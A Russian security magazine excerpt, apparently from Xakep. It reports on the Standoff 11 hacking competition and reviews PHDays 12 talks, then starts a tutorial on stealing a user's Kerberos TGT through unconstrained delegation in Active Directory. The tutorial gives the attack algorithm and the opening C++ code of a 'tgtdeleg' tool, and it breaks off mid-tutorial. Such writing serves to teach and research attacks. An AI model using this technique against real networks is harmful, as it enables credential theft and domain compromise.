      тник из команды DRT & Cult                »
СОРЕВНОВАНИЕ

Хоть в этот раз Standoff был приурочен к конференции PHDays (19–20 мая),
сама кибербитва началась на несколько дней раньше — 17 мая. За эти нес‐
колько дополнительных дней команды атакующих успели исследовать сеть
и закрепиться на некоторых объектах.

      «С каждым разом организаторы и создатели киберполигона вносят
       изменения, улучшая и оптимизируя процесс игры. Инфраструктура«
       Standoff стала заметно стабильнее, техподдержка стала работать опе-
       ративнее,   появилось   много  новых   интересных   недопустимых
      событий», — участник из команды DRT & Cult                »
Пока атакующие крушили все на своем пути и устраивали недопустимые
события одно за другим, действия защитников можно описать всего одной
фразой: «Они пытались». За то время, пока команды хакеров оформили уже
с десяток недопустимых событий, защитники смогли расследовать всего
одно. В целом ничего удивительного в этом нет, поскольку и в реальной жиз‐
ни атакующие обычно сильно впереди. Хотя, конечно, грустно, что лучшие
защитники, даже в полной боевой готовности, показывают такие скромные
результаты.
   Впрочем, и команды атакующих тоже временами огорчали: сразу несколь‐
ко команд сообщили, что некоторые  участники ведут себя агрессивно
и мешают другим командам. Это запрещено правилами и наказывается орга‐
низаторами, но, к сожалению, иногда еще встречается.


БАГИ — СЛУЧАЙНЫЕ И СПЕЦИАЛЬНЫЕ

Лучшим другом и самым ненавидимым врагом команд хакеров стал новый
дашборд для сдачи отчетов: мало того, что файрвол в начале игры просто
забанил игроков из недружественных стран (организаторы быстро исправили
эту оплошность), так еще и сам дашборд чаще показывал ошибку 404, чем
полезную информацию.





               Страница, которая преследовала всех игроков

Тем не менее в целом сдавать отчеты стало куда приятнее, чем в прошлые
годы, — прогресс налицо!
   Что касается самой виртуальной инфраструктуры, город F превратился
в самое настоящее государство с конкурирующими фирмами, глубокой
связью между разными объектами и, конечно, людьми, которые ведут себя
почти как живые (а потому их можно обмануть!).
   Именно на социальную инженерию был сделан основной упор в этот раз
(как, впрочем, и в прошлый). Мир меняется, и чисто технические взломы
через SQL-инъекцию на лендинге в реальном мире встречаются уже не так
часто, а письма с сюрпризом, наоборот, постоянно набирают актуальность.
Организаторы учли это при планировании киберполигона, чтобы максималь‐
но приблизить все к действительности. Кстати, в рамках этого Standoff имен‐
но через зараженные письма удалось проникнуть в сети большинства объ‐
ектов, а в некоторые места вообще можно было попасть только через
фишинг.
   Реалистичности добавляли и периодически падающие сервисы, которые,
как и в обычной жизни, никто не спешил поднимать даже после массовых
сообщений о проблеме. Но нужно отдать должное оргам: в этот раз, в отли‐
чие от прошлых, техподдержка работала хорошо и заявки старались раз‐
бирать как можно быстрее.
  В общем, прогресс очевиден: уже сейчас десятки команд со множеством
участников могут играть, не опасаясь того, что сервис упадет из‑за косого
взгляда. При этом небольшая доля сюрпризов все равно остается.


ПАМЯТНЫЕ МОМЕНТЫ

Мы попросили команды назвать самый волнующий момент за весь Standoff.
Вот что они сказали:


      «В последние минуты соревнования на  портале,  предназначенном
      для отправки отчетов о реализации недопустимых событий, перестала«
      нажиматься кнопка „Отправить отчет“. Баллы за него потенциально
       могли повлиять на результаты нашей команды, но все обошлось», —
       участник из команды DRT & Cult
         «Дольше всего тянулись последние двадцать минут и четыре часа
       после  закрытия  сети, пока подводили  итоги, —  только  тогда мы
      поняли, что не заметили несколько важных бизнес‑рисков, которые
       могли принести нам баллы», — участник из команды Bulba Hackers
       «Самым захватывающим моментом у нас оказался подбор пароля
       к одному из устройств: мы пытались подобрать пароль с разными
       словарями уже два часа и только тогда случайно нашли нужный нам
       словарь», — участник из команды Invuls                »


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
        STANDOFF 11
            КАК ПРОШЛИ СОРЕВНОВАНИЯ ПО ВЗЛОМУ
                                    ГОРОДА





ОФЛАЙН

Команды могли участвовать в Standoff как очно, так и удаленно.





                  Codeby мирно разносит полигон





             Информации, что это за команда, не сохранилось





                        Макет города‑государства F

Много внимания привлекал макет города‑государства F, который стал жер‐
твой атак участников Standoff. И неудивительно: в среднем каждые двенад‐
цать минут в городе происходило какое‑то недопустимое событие, так что
наблюдать было за чем.





                 Codeby уронили морской контейнер

Вот, например, последствия атаки на морской порт: взломав панель управле‐
ния краном, команда Codeby смогла уронить контейнер — случись такое
в реальности, компания понесла бы огромные убытки.





                                            Alert!

Каждый раз, когда участники Standoff оформляли отчет о недопустимом
событии, на экране вспыхивало уведомление. За эти несколько дней оно
появилось целых 204 раза! Но хакеры смогли реализовать только 64 уникаль‐
ных недопустимых события из 148 предусмотренных, так что следующий раз
обещает быть не менее интересным.





                          Там хакеры!

К сожалению, основная движуха PHDays прошла мимо участников Standoff:
перерывы были  предусмотрены  только на  ночь, и  единственный шанс
погулять по площадке присутствующим участникам соревнований выдался
только на награждении.


НАГРАЖДЕНИЕ

Когда‑то в Codeby заявляли, что хотят стать трехкратными победителями
Standoff, но превзошли сами себя и на Standoff 11 побеждают уже четвертый
раз подряд!





                                  Пятерка лидеров

Большинство команд участвовали дистанционно, но некоторые все же смогли
насладиться победой на сцене, среди них Codeby и True0xA3.





                      Codeby забирают призы





                               True0xA3

Bulba Hackers — еще одна команда, которая стремительно набирает скилл
и в этом году поднялась на пять позиций в таблице, войдя в топ-3. Говорю
об этом не без гордости, потому что сам в ней состою.





                             Bulba Hackers


ИТОГИ

Все участники состязания, с которыми мне удалось поговорить, сказали, что
с удовольствием повторят этот опыт. Организаторам удалось в очередной
раз покорить сердца хакеров, а значит, следующему Standoff быть и он станет
не менее интересным, чем этот.


      «Этот  Standoff  полностью  оправдал наши  ожидания:  длительная
      и  изнурительная  подготовка  полностью  оправдалась», —  участник«
      из команды DRT & Cult
         «Хочу сказать, что в целом нам все очень понравилось. Огромное
       спасибо  организаторам за весь  этот  проект — за ним большое
      будущее», — участник из команды Codeby
        «В первый раз мы решили участвовать потому, что до этого уви-
      дели стенд и поняли, что это будет весело. Ожидания полностью
       оправдались, и мы будем участвовать снова!» — анонимный участник                »





                                Афтепати

Когда основная  кибербитва  закончилась,  команды хорошо  оторвались
на афтепати. Но сидеть сложа руки они не намерены: как минимум одна
команда сразу же начала подготовку к следующему Standoff, который должен
пройти в конце года. Готовиться можно на площадке Standoff 365 — полигон
там поддерживается в актуальном состоянии, а правила максимально приб‐
лижены к основному Standoff, так что участвовать после тренировки там будет
проще.


     «Наша  команда была больше  всего  удивлена  подготовкой  других
      команд: мы не учли, что многие команды (не только топ-5) достаточно«
       сильно готовились в течение  этого года», — участник из команды
        Invuls                »
В целом одиннадцатый Standoff стал логическим продолжением девятого
и десятого, только лучше. Проблемы с сетью исправили, сервисы тоже стали
куда устойчивее. Для сохранения былых ощущений остался разве что глюч‐
ный дашборд. К тому же игра стала обширнее, появились новые объекты
и новые недопустимые события.
   Этот Standoff оставил очень положительные впечатления у участников, так
что есть все основания полагать, что к следующему разу Positive Technologies
постарается удивить нас еще больше. Если тебя заинтересовало участие —
начинай готовиться, изучай отчеты других команд, и до встречи на следующей
битве!
COVERSTORY





          ВСПОМИНАЕМ
           ВЫСТУПЛЕНИЯ,
       ЗАПИСИ КОТОРЫХ СТОИТ
           ПОСМОТРЕТЬ




Конференции — это для меня в первую
очередь  интересные  доклады, и PHDays
12 в этом плане не подвел. Было стойкое
ощущение, что надо успеть  везде, хоть
это и оказалось невозможно — выступле‐             FearZzZz                                                                                Непрерывно двигайся. Ад
ния  с  привлекательными темами  неиз‐     пожирает праздных. AppSec,                                                                             Bug Bounty, Legal Hacking.
менно перекрывали друг друга по времени.       Telegram channels:@lockpick@razehell,
Хвала  организаторам:  они  выкладывают         vladfearzzzz@gmail.com
видео в публичный доступ, и теперь можно
сходить на PHD, не вставая с дивана.


             INFO

                           Читай также мой отчет с PHDays 12: «Как хакеры
                         наводнили парк Горького».


В этом году доклады были разделены и проходили в двух стоящих рядом шат‐
рах. Один назывался «Зал боевых искусств» (атака), другой — «Школа само‐
обороны»  (защита).  Бурные  аплодисменты  слышались  то  тут,  то  там,
но наибольший ажиотаж все же царил в шатре защиты. Там было не протол‐
кнуться! В «Зале боевых искусств», начиная с середины первого дня, толкучка
была заметно меньше, хотя доклады тут тоже шли весьма интересные.


        WWW

                         Записи докладов ты можешь найти как на сайте
                     PHDays, так и на YouTube.



1. ГЕОПРОСТРАНСТВЕННАЯ РАЗВЕДКА НА ВАШЕМ РАБОЧЕМ
СТОЛЕ

 • Секция: #OFFENSE
 • Спикер: Schwarz Osint, автор каналов @geoint и @schwarz_osint
 • Запись доклада

Советую пойти и немедленно скачать вот отсюда презентацию этого загадоч‐
ного джентльмена в маске и очках. Зачем? Во‑первых, это интересный док‐
лад с необычной подачей. Во‑вторых, в файле есть куча ссылок и QR-коды,
так что жаждущим знаний будет чем заняться.

     «На вещи надо смотреть шире», — Schwarz Osint«               »





Что особенно понравилось в его выступлении, так это доступность материала
даже для совсем несведущих. Да и последовательность подачи не позволила
во всем этом хоть мало‑мальски запутаться. Всё на своих местах, бери
да вникай: и что такое вообще GEOINT, и на какой главный вопрос отвечает
эта дисциплина (спойлер: OSINT — «что?», GEOINT — «где?»), и какая
методология есть в арсенале специалистов и энтузиастов. Постигнув эту дис‐
циплину, ты, например, сможешь понять, что происходит в точке на карте, где
было сделано фото.
   Спикер щедро отсыпал знаний про область применения GEOINT, показы‐
вал реальные кейсы и даже перечислил популярные рабочие инструменты,
попутно упоминая их особенности и область применения.

      «Аналитик должен быть ленивым», — Schwarz Osint«               »
Тонкости работы с изображениями (да, метаданные в 2023 году живее всех
живых, не поверишь), с видеозаписями (панорамирование), со специфичес‐
кими объектами (горы, тени и прочее) и вагон иной интересной информа‐
ции — все это спикер уместил в тридцать минут. Затем последовала
не менее интересная часть ответов на вопросы. Они гармонично дополнили
сам доклад, поэтому не проходи мимо.
   Если просмотр записи приведет тебя в восторг, рекомендую продолжить
веселье   и   посмотреть   оба    выступления   Андрея   Масаловича,
номера 8 и 9 в этом списке.


2. APT-МАГИЯ В ЗОНЕ РОССИЙСКО-УКРАИНСКОГО КОНФЛИКТА

 • Секция: #DEFENSE
 • Спикеры: Георгий Кучерин и Леонид Безвершенко, «Лаборатория Кас‐
   перского»
 • Запись доклада

«Обыкновенная магия», «облачный чародей», «корм для рыб», «все переп‐
летено»... Это не главы из новой книги о знаменитом волшебнике, а слайды
к пламенному выступлению двух специалистов «Лаборатории Касперского».
Они рассказали детективную ИБ‑историю с закрученным сюжетом и неожи‐
данным финалом (да и финалом ли?).
   Как это часто бывает, все началось с целевого фишинга, при котором про‐
исходила рассылка на первый взгляд легитимного PDF-файла. Первая при‐
манка датирована аж 2021 годом, а основная волна заражений началась уже
в следующем году. Георгий и Леонид раскрыли детали атаки, разобрали
на составляющие инсталлятор и обратили внимание слушателей на интерес‐
ные нюансы. Спойлерить не буду, но отмечу забавный момент про название
Powermagic (непосредственно вредонос) — его придумали злоумышленники,
назвав так директорию, из которой работал зловред.
   Следующий этап доклада был посвящен более сложному импланту —
фреймворку под названием Commonmagic.





Анализ Powermagic и Commonmagic не прояснил один довольно важный воп‐
рос: какая именно APT-группировка стояла за атаками? На помощь пришли
коллеги из‑за рубежа, помогли поэтапно восполнить пробелы в информации.
Эксперты Malwarebytes — одной из компаний, поделившихся своим иссле‐
дованием, — умудрились даже некоторое время следить за атакующими.

      «In this case, attributing the attack to a specific country is not
     an easy task», — Malwarebytes«                »
Дальше выступающие рассказали про новые угрозы и их новые имена, при‐
вели технические разборы нюансов и объяснили детали допущенных зло‐
умышленниками ошибок.
  Под конец доклада перед зрителями вырисовался совершенно новый тай‐
млайн  атаки.  Оказалось,  что  стоящая  за ней  группировка  сохраняла
активность больше пятнадцати лет и, возможно, еще покажет себя.





Рекомендую посмотреть доклад, а также можешь глянуть на первую часть
исследования, опубликованную в блоге Securelist.


3. ПРАЗДНИК К НАМ ПРИХОДИТ: АТАКИ НА НОВОГОДНИЕ САЙТЫ
И СТРАНИЦЫ ПРОМОАКЦИЙ

 • Секция: #OFFENSE
 • Спикер: Александр Колчанов, независимый исследователь
 • Запись доклада

Этот доклад будет полезен в первую очередь руководителям компаний
и менеджерам, которые организуют рекламные акции и конкурсы. Александр
Колчанов — опытный багхантер и на протяжении всего повествования давал
примеры плохих практик из личного опыта.
   Сайты промоакций атакуют чаще, чем можно себе представить. Нередко
для проведения акций используются сторонние сервисы, и чем их больше,
тем выше вероятность столкнуться с уязвимостями и утечками данных. Также
нельзя забывать про репутационные риски при больших финансовых вло‐
жениях компаний. Плюс к этому — большая затрата ресурсов ИБ‑отдела.
На старте акции приходится поднимать множество сервисов, а по завер‐
шении все их грамотно гасить (аккаунты, серверы, домены, поддомены и про‐
чее).
   Опираясь на свой опыт, Александр перечислил наиболее актуальные
методы атак, явный лидер среди которых — перехват домена. Немало проб‐
лем вызывают и попытки компаний сэкономить. Все сайты зачастую заводят
на одном аккаунте, даже без дополнительных настроек прав доступа.
   Возможны и финансовые  атаки. В  качестве примера был  упомянут
СМС‑флуд, способный высушить бюджет акции полностью. Иногда виновата
бывает аутентификация: удобство входа на промосайт часто ставят выше
безопасности и здравого смысла.
  Еще из интересного: поддельные утечки данных (лихой замес из OSINT
и жгучего желания нанести репутационный риск компании), накрутки в игро‐
вых акциях и мошенничество, нарушения со стороны подрядчиков, утечки
данных сотрудников и многое другое.
   Кстати, о подрядчиках. С их стороны возможно множество сюрпризов:
закупка сомнительной рекламы, использование чужих аккаунтов, накрутки
и прочее в таком духе.
  А еще Александр упомянул очень неприятную для всех  багхантеров
вещь — периодически возникающее паразитирование компаний на самой
идее багбаунти. С обманами, хотфиксами уязвимостей и даже угрозами. Увы,
такое тоже встречается.


4. G/VRP

 • Секция: #FAST TRACK
 • Спикер:     lalka,   независимый    исследователь,   автор   канала
   @ScriptKiddieNotes
 • Запись доклада

Начинающим хантерам или тем, кто не знает, как вкатываться в охоту за баун‐
ти, рекомендую обратиться к мудрости Лалки. Не пугайся, что речь в докладе
идет о Google. Основная мысль в том, что баги есть везде.
   Что до матерых потрошителей вебчика, то для них этот доклад просто три‐
надцать минут хорошего настроения. Спойлерить не буду, так как выступле‐
ние и без того короткое. Экспрессивная подача материала после просмотра
каждому багхантеру дает +13 пойнтов к мотивации, +37 пойнтов к удаче
на нахождение критов и на 101 пойнт снижает шансы на дупли. Так что глянь
доклад — и бегом искать баги прямо сейчас. Можешь даже не дочитывать
статью!


5. СОБРАТЬ ДАННЫЕ РАНЬШЕ ЗЛОУМЫШЛЕННИКА

 • Секция: #FAST TRACK
 • Спикер: Елизавета Рыженкова, «Бизон», автор канала @fuckwebsec
 • Запись доклада

Елизавета Рыженкова рассказала о своем опыте выуживания (краулинга, если
угодно) из недр GitHub всевозможных токенов доступа, секретных ключей
и другой полезной информации. Также она поделилась скриптом на Python,
чтобы все желающие тоже смогли получить удовольствие.





Из‑за чего вообще весь шум? Из‑за плохих практик программирования
и банальной невнимательности, когда в публичных репозиториях можно най‐
ти токены, пароли, лицензионные ключи и прочие вещи, которые не должны
протекать наружу. Злоумышленникам ведь тоже ничего не стоит автомати‐
зировать их поиск и валидацию. Атака по своей сути простая, не требует
от злоумышленника получать права в системе, а импакт критический.
   Елизавета не только рассказала о наиболее популярных тулзах, которые
используют для решения таких задач, но и уточнила, что, помимо отдельных
токенов, можно нередко встретить и целые файлы, щедро набитые разнооб‐
разными кредами; также упомянула методы поиска информации по GitHub
(дорки), не забыв и про комплексные решения вроде Git Dorker; затем рас‐
сказала про способы исправления радиуса кривизны рук разработчиков (pre-
commit hook, SAST-решения, интеграция в CI и так далее).
  И напоследок — важнейшее напоминание: если секреты внезапно перес‐
тали быть секретами (читай: данные скомпрометированы, компания взло‐
мана), то поможет только инвалидация старых токенов и создание новых.
И самое главное — после этого не наступить на те же грабли еще раз и не
выкладывать новые токены на GitHub!
   Смотреть запись доклада нужно строго параллельно с презентацией, ина‐
че можно упустить пару моментов. Либо можешь пытаться разглядеть слайды
прямо в записи.


6. КАК ЗАЩИТИТЬСЯ ОТ «БЕСТЕЛЕСНЫХ» ВЕБ-ШЕЛЛОВ

 • Секция: #FAST TRACK
 • Спикеры: Даниил Садырин и Андрей Сикорский, CyberOK
 • Запись доклада

Стремительный доклад, в котором слово взял Даниил и рассказал, какие
веб‑шеллы сейчас встречаются в «дикой природе» и как с ними обращаться.
Например, доступный из веба шелл в виде файла на диске легко обнаружить;
попытка  залить шелл  через  уязвимость  в  веб‑приложении (Command
Injection, Object Injection и подобное) может стриггерить WAF, а саму уяз‐
вимость вскоре после обнаружения может пропатчить разработчик.
  В общем, докладчик прошелся по основным нюансам, заключив, что впол‐
не можно прятаться в памяти процесса веб‑приложения. Основные плюсы
этого метода: не нужен файл, можно маскировать запросы на выполнение
кода к легитимным скриптам. Минус: зависимость срока жизни такого бэк‐
дора от аварийного завершения процесса или перезагрузки веб‑сервера.
   Даниил отметил, что ни в одном из предыдущих исследований этого воп‐
роса нет  универсального  подхода  к внедрению  бестелесного  бэкдора
при минимальных правах в системе.
   Вторую часть доклада, посвященную выявлению бестелесных сюрпризов
и защите от них, взял на себя Андрей Сикорский. Он рассказал о решении
под названием SOLDR (System of Orchestration, Lifecycle control, Detection
and Response) и напомнил о такой потрясающей штуке, как аудит. Вряд ли
кто‑то станет спорить с тем, что важно отлавливать в том числе и бестелес‐
ные  бэкдоры, не  дожидаясь  стадии  постэксплуатации, которая далеко
не факт что произойдет сразу.
  В первую очередь доклад будет полезен разработчикам и администра‐
торам, которые хотят знать о последних трендах в безопасности или хотя бы
ориентировочно представлять себе, с какими явлениями можно столкнуться.


7. ЗАБЛОКИРУЙ МЕНЯ ПОЛНОСТЬЮ, ИЛИ НЕ ВСЕ VPN
ОДИНАКОВО ПОЛЕЗНЫ

 • Секция: #FAST TRACK
 • Спикер: Константин Евдокимов, независимый исследователь
 • Запись доклада

Константин начал свое бодрое повествование с оды Роскомнадзору за вклад
в популяризацию VPN в России. Затем дал общие советы по выбору VPN,
упомянув фродскоринг (грубо говоря, индикатор риска) и всеми любимый
деанон (не путай с производителем йогуртов).
   Этот самый деанон случается при так называемом VPN-фейлбэке: когда
соединение обрывается на пару секунд, твои данные продолжают разбегать‐
ся на все четыре стороны, даже если соединение благополучно восстанов‐
лено.
   Спикер дал слушателям пару важных советов. Например: не доверяй сво‐
ему провайдеру, не доверяй РКН, шифруй сетевой канал и помни про SSL-
мимикрирование. После этого докладчик благополучно перешел к финальной
части, в которой рассказал про методы обхода ограничений РКН, а под конец
нагрузил любопытных слушателей ссылками на тематическое чтиво.
   Доклад будет особенно интересен тем, кто по какой‑то причине все
еще не интересовался этой темой достаточно подробно.


8. МЫ ЗНАЕМ, ЧТО ВЫ ДЕЛАЛИ ПРОШЛЫМ ЛЕТОМ: КАК УЗНАТЬ
ВСЁ О ЧЕЛОВЕКЕ ПО ОТКРЫТЫМ ИСТОЧНИКАМ

 • Секция: #НАУЧПОП
 • Спикер: Андрей Масалович AKA КиберДед, «Инфорус», автор канала
   @deedcoin_club
 • Запись доклада

Враг знает систему. Вокруг нас дебилы. Среда нулевого доверия. Интригует?
   Андрей Масалович, широко известный в комьюнити под псевдонимом
КиберДед,  развлекал  публику, ненавязчиво посвящая в основы OSINT:
перечислил арсенал нападающих и дал советы о том, как хотя бы минимально
затруднить слежку за нашими девайсами.





Дальше пошли кейсы посложнее. Не знаю, многие ли удивятся, но уход
из социальных сетей и удаление аккаунта не поможет скрыться ни от зло‐
умышленников, ни от представителей силовых структур. Равно как балаклава
на голове и отсутствие в карманах гаджетов не спасут от деанона и ответс‐
твенности за содеянное.
   Затем Масалович рассказал о бытовых гаджетах, которые становятся
умнее, чем нужно. Хорошая новость в том, что пока следить потенциально
может только самая дорогая техника, но это явление временное. И конечно,
за нами шпионят не только бытовые гаджеты и приборы, но и фитнес‑брас‐
леты, смартфоны, умные весы (забавный случай, кстати) и, конечно, соцсети,
что не должно быть для тебя таким уж шоком. В общем, все, что может
собирать информацию, обязательно будет. Добро пожаловать в реальный


    «Мы проснулись на планете, захваченной роботами, которые
     нас сдают, еще по предварительному сговору в составе орга‐мир!«
      низованной преступной группы», — КиберДед                »
Разбор интересных кейсов, СОРМ, «Пять глаз», интерпретация собранных
данных, нейросети, ЧатГоПоТа и многое другое смешано в один мощный
информационный коктейль, который я тебе рекомендую продегустировать
лично.


9. А ЧТО, ТАК МОЖНО БЫЛО? 15 МАЛОИЗВЕСТНЫХ ПРИЕМОВ
OSINT

 • Секция: #OFFENSE
 • Спикер: Андрей Масалович AKA КиберДед, «Инфорус», автор канала
   @deedcoin_club
 • Запись доклада

Я не мог удержаться и глянул и второй доклад Масаловича. Он частично
пересекается с первым, но в то же время дополняет его: бытовая техника,
которая за нами шпионит; совсем новый вид шпионажа под названием
PlaceRaider (фотоприложение для 3D-шпионажа); ChatGPT проходит капчу,
обманывая человека; «Фейсбук» и его система подсказок, выдающая «скры‐
тых друзей»; геопозиция в «Твиттере» и сказочные персонажи, ее не отклю‐
чающие; сервисы местоположения вроде Glympse; ландшафтная навигация
(на этом моменте доклад пересекается с дисциплиной GEOINT, о которой
в  первый день форума PHD  рассказывал Schwarz  Osint); Cross-Device
Tracking; акселерометр смартфона и многое‑многое другое.

     «Живем на позитиве, у нас есть своя фига в кармане!» — Кибер-
     Дед«                »
Финал доклада — это, грубо говоря, напоминание все тех же трех важных
моментов: «враг знает систему», «вокруг нас дебилы» и «среда нулевого
доверия». Рекомендую к просмотру!


10. ТОП-10 АРТЕФАКТОВ LINUX ДЛЯ РАССЛЕДОВАНИЯ
ИНЦИДЕНТОВ

 • Секция: #DEFENSE
 • Спикер: Лада Антипова, Angara Security, автор канала @s3Ch1n7
 • Запись доклада
 • Презентация

Лада Антипова спокойно и без лишней суеты рассказала, как искать медь,
а находить золото, ну или что делать, если мы столкнулись с подозрительной
активностью в живой системе.

     «Grep — наш лучший друг!» — Лада Антипова.«               »
Но мало любить grep всем сердцем, надо еще и выучить его синтаксис,
а потом не забывать использовать этот мощнейший инструмент всегда и вез‐


      «Когда мы смотрим любую информацию в системе, мы всегда
    ищем аномалии», — Лада Антипова.де.«                »
После этого Лада перешла к основной части доклада, в которой перечислила
топ-10 артефактов, которые нужно получать и изучать при расследовании
инцидентов. Лада подробно рассказала об особенностях и нюансах каждого
из них, опираясь на свой опыт.
   Вопросы были тоже интересные: собравшиеся коллеги по цеху не удер‐
жались и поделились своими секретами мастерства. В общем, доклад крутой,
доступный, информативный и слушается с удовольствием.


Другие интересные доклады

 • «Искусство   следопыта  в  корпоративной  инфраструктуре:

   как  поведенческие  индикаторы  помогают  в  расследовании
   инцидентов» — Анна Олейникова, Security Vision
 • «Социальная  инженерия:  тенденции  red  team,  технические
  аспекты  kill chain и проектный опыт» —  Константин Полишин,
   Positive Technologies
 • «Современные атаки на Google Chrome» — Алиса Шевченко, Zero
   Day Engineering (есть еще оригинал на английском)
 • «Интернет‑картография в 2023 году. Чего не может Shodan» —
   Сергей Гордейчик, Александр Гурин, Игорь Первушин, CyberOK
 • «Киберразведка — это просто, и чем она отличается от „про-
   бива“, OSINT и HUMINT» — Дмитрий Махаев, «Ростелеком‑Солар»
 • «Кто, как и зачем атакует Linux-инфраструктуры» — Олег Скулкин,
   «Бизон»
 • «У deception нет цели, есть  только путь» — Алексей  Егоров,
   «Бизон»
 • «Фейковые утечки: слив НЕ засчитан?» — Николай Чурсин, Positive
   Technologies
 • «Компрометация  сети  через  средства  резервного  копиро-
  вания» — Александр Коротин, «Лаборатория Касперского»
 • «Red teaming: методики фишинговых атак» — Вадим Шелест, МТС
  RED (доступна презентация)
 • «Как понять, что твоя инфраструктура взломана» — Константин
   Васильев и Олег Слепушенко, «ИБ Реформ»




ВЫВОДЫ

На фоне довольно прямолинейных выступлений особенно выделились док‐
лады Schwarz Osint и Лалки — как за счет выбранных спикерами образов, так
и за счет подачи. С изюмом и интригой!
  При подготовке материала я заметил, что непосредственное присутствие
на выступлениях и просмотр этих же докладов в записи дают ощутимо разное
восприятие одной и той же информации. Очень жду, что организаторы опуб‐
ликуют оставшиеся презентации, чтобы можно было с кайфом пересмотреть
все еще раз.
  Всем спикерам без исключений — моя благодарность за информацию
и смелость! Решиться на публичное выступление без нее непросто. Вы —
мощь!
ВЗЛОМ





          ЭКСПЛУАТИРУЕМ
            TGT DELEGATION
         В ACTIVE DIRECTORY





В этой статье мы рассмотрим не очень
популярную, но крайне интересную атаку,
реализовав  которую  атакующий  сможет
получить  TGT-билет  пользователя, даже
не зная его пароля либо хеша. Хакеру дос‐            _MKS_                                                                                       konovalovmaks0304@mail.ru
таточно лишь выполнить код от лица этого
пользователя, а все  остальное  сделает
за нас KDC.


Active Directory предоставляет мощный набор функций для делегирования
прав на олицетворение пользователей конкретной службе. Существует три
вида  делегирования:  неограниченное,  ограниченное  и  ограниченное
на основе ресурсов. Про каждый уже рассказывалось много раз, но какие
еще возможности таит в себе механизм делегирования?


ОСОБЕННОСТИ НЕОГРАНИЧЕННОГО ДЕЛЕГИРОВАНИЯ

При  неограниченном  делегировании  администратор  приходит  к  службе
и говорит: «Теперь ты можешь олицетворять клиентов на других службах».
Причем на абсолютно любых службах (отсюда и название — неограничен‐
ное). Как это работает?
   Во‑первых, клиент обращается к службе с неограниченным делегирова‐
нием.  KDC   видит,   что   эта   служба   имеет   специальный   флаг
TRUSTED_FOR_DELEGATION (он сигнализирует о том, что у службы настроено
неограниченное делегирование), поэтому возвращает клиенту TGS на эту
службу, но со специальным флагом OK-AS-DELEGATE. Следующим шагом кли‐
ент проверяет этот самый флаг. Если он видит, что флаг установлен, то
понимает: служба использует неограниченное делегирование, поэтому кли‐
ент вновь идет к KDC и запрашивает специальный FORWARDED TGT, который
будет отправлен службе.
   Внутри этого тикета будет лежать также сессионный ключ, что позволит
службе без проблем олицетворять клиента. Далее у клиента будет TGS-тикет
на службу, а также этот FORWARDED TGT, поэтому пора идти к службе.
Генерируется запрос AP-REQ, который содержит этот самый FORWARDED
TGT.





                 FORWARDED TGT в AP-REQ

Причем тикет будет находиться внутри так называемого аутентификатора. Он
позволяет предотвратить возможность релей‑атаки на этап AP-REQ, так
как аутентификатор зашифрован сессионным ключом, а также содержит (в
случае обычного AP-REQ) имя принципала клиента и таймстемп. Если же
служба настроена с неограниченным делегированием, то в запрос AP-REQ,
который отправится службе, попадет не только таймстемп и имя принципала,
но и FORWARDED TGT. Причем этот самый FORWARDED TGT будет лежать
внутри аутентификатора. Сессионный ключ для шифрования аутентификатора
клиент получает в ответе TGS-REP, который идет до AP-REQ.
   Таким образом, у атакующего появляется возможность расшифровать
аутентификатор из AP-REQ, а затем получить TGT-билет  пользователя,
который инициировал обращение к службе с неограниченным делегирова‐
нием, ведь на руках у него будет зашифрованный блоб и ключ для его дешиф‐
ровки.


ОСОБЕННОСТИ ЭКСПЛУАТАЦИИ

Чтобы успешно получить TGT, нужно, чтобы выполнялись следующие требова‐
ния:
 • служба, к которой обращается  клиент, настроена на неограниченное
   делегирование. Но здесь ничего страшного нет — все контроллеры
  домена настроены с неограниченным делегированием;
 • у нас есть возможность выполнить код от лица клиента.

Итоговый алгоритм достаточно простой:
 1. Обращаемся к службе с неограниченным делегированием.
 2. Получаем сгенерированный AP-REQ.
 3. Извлекаем сессионный ключ для расшифровки аутентификатора.
 4. Расшифровываем аутентификатор.
 5. Извлекаем TGT.


ОБНАРУЖЕНИЕ НУЖНОЙ СЛУЖБЫ

Итак, сначала создаем файл Header.h, в котором указываем все нужные
заголовочные файлы, подгружаемые либы, а также прототип одной‑единс‐
твенной функции.


#pragma once
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <DsGetDC.h>
#include <NTSecAPI.h>
#include <iostream>
#include <locale.h>
#include <wincrypt.h>
#include <WinBase.h>
#define DEBUG
#pragma comment (lib, "Secur32.lib")
#pragma comment (lib, "NetApi32.lib")
#pragma comment(lib,"Crypt32.lib")
DWORD TgtDeleg(LPCWSTR);

Теперь стоит предусмотреть два варианта работы инструмента: в первом
случае служба с неограниченным делегированием будет обнаружена авто‐
матически (достаточно только имени домена), а во втором атакующий собс‐
твенноручно сможет указать нужный SPN.





       Получение сессионного ключа и AP-REQ через указание домена





                            Ручное указание SPN

Главная функция инструмента не очень большая. Сначала получаем список
аргументов, причем проверяем: если их не три, то атакующий указал что‑то
не то, поэтому вызываем функцию, которая расскажет, как использовать инс‐
трумент.


int wmain(char argc, wchar_t* argv[]) {
    setlocale(LC_ALL, "");
    ShowAwesomeBanner();
    if (argc != 3) {
        ShowUsage();
    }
    ....
}



void ShowUsage() {
    std::wcout << L"tgtdeleg.exe 1 <DOMAIN NAME>\n\tEx: tgtdeleg.exe
1 cringe.lab" << std::endl;
    std::wcout << L"tgtdeleg.exe 2 <SPN With Unconstrained Deleg>\n\t
Ex: tgtdeleg.exe 2 CIFS/dc01.cringe.lab" << std::endl;
    exit(-1);
}





               Информация об использовании инструмента

Если же пользователь нигде не напортачил, то переходим к парсингу аргу‐
ментов. В первом случае, когда указывается только имя домена, вызывается
функция GetDomainController().


LPCWSTR targetname = NULL;
    switch (*argv[1]) {
    case '1':
        targetname = GetDomainController(argv[2]);
        break;
        ...

Эта функция позволяет получить DNS-имя контроллера домена. Мы берем
контроллер домена потому, что на нем по умолчанию включено неограничен‐
ное делегирование. Получить имя можно с помощью функции DsGetDcName(
).


LPCWSTR GetDomainController(wchar_t* domainName) {
    PDOMAIN_CONTROLLER_INFO dcInfo = NULL;
    DWORD err = DsGetDcName(NULL, (LPCWSTR)domainName, NULL, NULL,
DS_RETURN_DNS_NAME | DS_IP_REQUIRED, &dcInfo);
    if (err != ERROR_SUCCESS) {
        std::wcout << L"[-] Cant Get DC Name, try use 2 mode: " <<
err << std::endl;
        exit(-1);
    }
    return dcInfo->DomainControllerName;
}

После получения имени убираем из него первые два символа слеша (так
как функция вернула \\dc01, а нам нужно просто dc01), а затем добавляем
